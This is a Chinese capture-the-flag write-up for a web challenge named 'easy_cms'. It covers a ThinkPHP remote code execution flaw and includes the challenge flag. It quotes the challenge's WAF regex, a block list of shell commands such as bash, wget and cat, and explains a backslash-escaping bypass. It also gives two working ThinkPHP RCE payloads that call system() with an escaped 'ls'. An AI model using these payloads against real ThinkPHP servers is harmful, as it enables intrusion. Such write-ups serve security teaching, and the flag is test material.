题目名称：easy_cms

题目类型： WEB

题目难度：容易

出题人：ljxxxxx

考点：

thinkphp漏洞复现

rce waf 绕过

描述：小李同学安装了thinkphp框架，却发现框架有漏洞。决定尝试修复一下，发现搞不懂thinkphp路由关系，最终采取其他方式....（搞不定理由我还搞不定你？）

flag：flag{68ff971077c08515fdbbd83fac40fca1}

Writeup：题目给了robots.txt 提示www.zip

下载题目源码

将源码放到phpstudy内，输入poc进行调试，一步一步跟进到命令执行处

在App.php 321行和获得rce waf（存在两种poc，另一种poc的waf过滤在Request.php 1083行）

![image-20221019202038560](C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20221019202038560.png)

![image-20221019202402676](C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20221019202402676.png)

```php
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $value2))
```

绕过waf：利用linux中的特性 ca\t的执行结果和cat一致，而waf只过滤了`\\`和`\\\\`

poc:

```php
?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=l\s
```

或者

```php
?s=captcha  POST
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=l\s
```

